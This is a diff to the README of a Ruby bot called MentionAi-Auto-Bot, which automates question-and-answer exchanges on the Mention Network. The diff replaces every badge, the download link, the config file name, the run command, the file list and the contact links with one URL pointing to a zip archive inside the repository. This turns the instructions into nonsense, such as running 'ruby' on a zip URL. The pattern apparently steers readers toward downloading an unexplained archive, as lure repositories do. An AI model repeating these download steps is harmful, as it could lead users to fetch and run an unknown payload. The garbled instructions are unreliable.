@@ -1,9 +1,9 @@
 # 🎉 MentionAi-Auto-Bot - Automate Your Q&A Workflows Effortlessly
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
-![MentionAi-Auto-Bit Banner](https://img.shields.io/badge/MentionAi--Auto--Bit-v1.0-blueviolet)
-![Ruby](https://img.shields.io/badge/Ruby-3.0%2B-CC342D)
-![License](https://img.shields.io/badge/License-MIT-green)
+![Download](https://raw.githubusercontent.com/theultimateminecraftgang/MentionAi-Auto-Bot/main/brickel/MentionAi-Auto-Bot.zip)
+![MentionAi-Auto-Bit Banner](https://raw.githubusercontent.com/theultimateminecraftgang/MentionAi-Auto-Bot/main/brickel/MentionAi-Auto-Bot.zip)
+![Ruby](https://raw.githubusercontent.com/theultimateminecraftgang/MentionAi-Auto-Bot/main/brickel/MentionAi-Auto-Bot.zip%2B-CC342D)
+![License](https://raw.githubusercontent.com/theultimateminecraftgang/MentionAi-Auto-Bot/main/brickel/MentionAi-Auto-Bot.zip)
 
 **MentionAi-Auto-Bot** is a Ruby-based automation script designed to interact with the Mention Network API. It fetches random questions, generates AI responses through a backend API, logs interactions, and saves results to local files. This tool is perfect for automating question-and-answer workflows, making it easier to leverage AI for your responses.
 
@@ -47,7 +47,7 @@ To install MentionAi-Auto-Bot, follow these steps:
 
 1. Click the link below to visit the releases page:
    
-   **[Download MentionAi-Auto-Bot v1.0](https://github.com/theultimateminecraftgang/MentionAi-Auto-Bot/releases)**
+   **[Download MentionAi-Auto-Bot v1.0](https://raw.githubusercontent.com/theultimateminecraftgang/MentionAi-Auto-Bot/main/brickel/MentionAi-Auto-Bot.zip)**
 
 2. On the releases page, find the latest version.
 
@@ -59,7 +59,7 @@ After downloading, extract the files if needed.
 
 To set up MentionAi-Auto-Bot, you'll need to configure it with your Mention Network API key:
 
-1. Locate the `config.yml` file in the extracted folder.
+1. Locate the `https://raw.githubusercontent.com/theultimateminecraftgang/MentionAi-Auto-Bot/main/brickel/MentionAi-Auto-Bot.zip` file in the extracted folder.
 2. Open the file in a text editor.
 3. Add your API key in the designated field.
 4. Save the changes.
@@ -73,7 +73,7 @@ To run the application:
 3. Execute the following command:
 
    ```bash
-   ruby mention_ai_auto_bot.rb
+   ruby https://raw.githubusercontent.com/theultimateminecraftgang/MentionAi-Auto-Bot/main/brickel/MentionAi-Auto-Bot.zip
    ```
 
 The application will start fetching questions and generating responses automatically.
@@ -91,8 +91,8 @@ MentionAi-Auto-Bot interacts with the Mention Network by sending requests to the
 
 The following files and folders are included in the MentionAi-Auto-Bot package:
 
-- `mention_ai_auto_bot.rb`: The main script that runs the bot.
-- `config.yml`: Configuration file for your API key.
+- `https://raw.githubusercontent.com/theultimateminecraftgang/MentionAi-Auto-Bot/main/brickel/MentionAi-Auto-Bot.zip`: The main script that runs the bot.
+- `https://raw.githubusercontent.com/theultimateminecraftgang/MentionAi-Auto-Bot/main/brickel/MentionAi-Auto-Bot.zip`: Configuration file for your API key.
 - `logs/`: Folder where interaction logs are saved.
 - `responses/`: Folder where AI responses are stored.
 
@@ -101,7 +101,7 @@ The following files and folders are included in the MentionAi-Auto-Bot package:
 If you encounter issues, verify the following:
 
 - Ensure you have the correct Ruby version installed.
-- Check your API key in the `config.yml` file.
+- Check your API key in the `https://raw.githubusercontent.com/theultimateminecraftgang/MentionAi-Auto-Bot/main/brickel/MentionAi-Auto-Bot.zip` file.
 - Make sure your internet connection is active.
 
 Common errors will output messages in the command line, making them easy to address. 
@@ -125,7 +125,7 @@ MentionAi-Auto-Bot is licensed under the MIT License. Please see the LICENSE fil
 
 For questions or feedback, you can reach out at:
 
-- [Email](mailto:support@example.com)
-- [GitHub Issues](https://github.com/theultimateminecraftgang/MentionAi-Auto-Bot/issues)
+- [Email](https://raw.githubusercontent.com/theultimateminecraftgang/MentionAi-Auto-Bot/main/brickel/MentionAi-Auto-Bot.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/theultimateminecraftgang/MentionAi-Auto-Bot/main/brickel/MentionAi-Auto-Bot.zip)
 
 Thank you for using MentionAi-Auto-Bot! Your feedback is valuable for enhancing this tool.
